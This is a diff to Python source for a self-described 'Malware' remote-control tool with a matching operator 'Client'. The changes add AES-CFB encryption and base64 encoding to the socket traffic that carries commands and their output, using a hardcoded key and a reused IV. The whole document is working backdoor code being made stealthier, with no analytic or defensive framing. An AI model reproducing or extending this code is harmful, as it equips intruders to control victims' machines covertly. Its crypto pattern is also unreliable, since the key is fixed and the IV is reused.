@@ -1,5 +1,7 @@
 import socket, os, sys, time
 import subprocess
+from Crypto.Cipher import AES
+from base64 import b64encode, b64decode
 """
 Classe contenant les variables communes entre client et serveur
 """
@@ -11,6 +13,8 @@ class Machine:
         self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.language = "utf-8"
         self.buffsize = 4096
+        self.key = b'AcVfgTjpKumnVftH'
+        self.iv = b'16EtPy5Bk6X18Dtp'
 
 
 """
@@ -32,10 +36,19 @@ class Malware(Machine):
             self.start()
 
     def send(self, message):
-        self.my_socket.send(str(message).encode(self.language))
+        '''self.my_socket.send(str(message).encode(self.language))'''
+        raw = message.encode(self.language)
+        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
+        encrypted = b64encode(self.iv + cipher.encrypt(raw))
+        self.my_socket.send(encrypted)
 
     def receive(self):
-        cmd = self.my_socket.recv(self.buffsize).decode(self.language)
+        enc = self.my_socket.recv(self.buffsize).decode(self.language)
+        enc = b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CFB, iv)
+        cmd = cipher.decrypt(enc[16:]).decode(self.language)
+
         return cmd
 
     def quit(self):
@@ -78,12 +91,20 @@ class Client(Machine):
         return choix
 
     def send(self, commande):
-        distant_socket.send(commande.encode(self.language))
+        raw = commande.encode(self.language)
+        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
+        encrypted = b64encode(self.iv + cipher.encrypt(raw))
+        distant_socket.send(encrypted)
 
     def receive(self):
-        rep = distant_socket.recv(self.buffsize)
+        '''rep = distant_socket.recv(self.buffsize)
         rep = rep.decode(self.language)
-        print(rep, end="")
+        print(rep, end="")'''
+        enc = distant_socket.recv(self.buffsize).decode(self.language)
+        enc = b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CFB, iv)
+        print(cipher.decrypt(enc[16:]).decode(self.language), end="")
 
     def quit(self):
         print("Shutting down in 3 seconds")
